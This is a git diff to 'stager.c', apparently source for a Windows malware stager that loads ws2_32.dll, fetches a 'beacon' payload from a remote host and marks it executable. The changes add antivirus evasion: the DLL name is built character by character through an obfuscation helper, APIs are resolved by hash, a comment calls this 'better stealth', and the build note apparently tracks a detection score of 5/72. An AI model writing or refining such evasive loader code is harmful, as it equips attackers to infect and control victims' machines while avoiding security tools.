@@ -8,7 +8,7 @@
  *
  * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe
  * 
- * // Working flags below, 4/72
+ * // Working flags below, 5/72
  * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all stager.c -o stager.exe 
  * */
 
@@ -18,16 +18,15 @@
 
 //#include <winsock2.h> // needed by socket and connect?
 #include "../utils/winsock_util.h"
-//#include "payload_util.h"
 #include "../utils/utils.h"
 #include "../utils/kernel32_util.h"
 #include "../utils/ntdll_util.h"
 #include "../utils/encryption_util.h"
 
+#include "../utils/ministd.h"
 
 
 
-//bool Stager::run(const std::string& host, const std::string& port)
 int run(const char* host, const char* port)
 {
     // 1. manually resolve apis
@@ -60,12 +59,38 @@ int run(const char* host, const char* port)
     //FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManual("ntdll.dll", "LdrLoadDll");
     FuncLdrLoadDll pLdrLoadDll = (FuncLdrLoadDll)GetProcAddressManualHash(ntdll_module, LDRLOADDLL_HASH);
 
-	// RtlInitUnicodeString(&usDllName, L"ws2_32.dll");
-    // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
+    ////////////////////////////////////
+    CHAR ModuleName[12] = {0}; // Increase size
+
+    ModuleName[0] = HideChar('W');
+    ModuleName[1] = HideChar('S'); // Fixed order
+    ModuleName[2] = HideChar('2');
+    ModuleName[3] = HideChar('_');
+    ModuleName[4] = HideChar('3');
+    ModuleName[5] = HideChar('2');
+    ModuleName[6] = HideChar('.');
+    ModuleName[7] = HideChar('D');
+    ModuleName[8] = HideChar('L');
+    ModuleName[9] = HideChar('L');
+    ModuleName[10] = HideChar(0); // Null terminator
+
     UNICODE_STRING usDllName;
-    usDllName.Length = 20;
-    usDllName.MaximumLength = 22;
-    usDllName.Buffer = L"ws2_32.dll";
+    WCHAR wideBuffer[32]; // Allocate wide char buffer
+    usDllName.Buffer = wideBuffer;
+    usDllName.MaximumLength = sizeof(wideBuffer);
+
+    SIZE_T Size = CharStringToWCharString(usDllName.Buffer, ModuleName, usDllName.MaximumLength);
+    usDllName.Length = (USHORT)(Size * sizeof(WCHAR));
+    ////////////////////////////////////
+
+    // RtlInitUnicodeString(&usDllName, L"ws2_32.dll");
+    // NOTE: use stack allocation instead of RtlInitUnicodeString for better stealth
+    //UNICODE_STRING usDllName;
+    //usDllName.Length = 20;
+    //usDllName.MaximumLength = 22;
+    //usDllName.Buffer = L"ws2_32.dll";
+    //SIZE_T Size = CharStringToWCharString(usDllName.Buffer, ModuleName, usDllName.MaximumLength);
+    //printf("size = %d", Size);
     PVOID ws2_32_module; // ws2_32.dll pModule
     NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &ws2_32_module);
     // TODO: for now we just assume it's always successful
@@ -210,7 +235,7 @@ int run(const char* host, const char* port)
 	}
 
     // EXECUTE_READ.
-    DWORD old_prot;
+    DWORD old_prot; // TODO: change to PDWORD lpflOldProtect?
     // NOTE: virtualProtect is also being called somewhere in the windows api
     if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE) 
     {
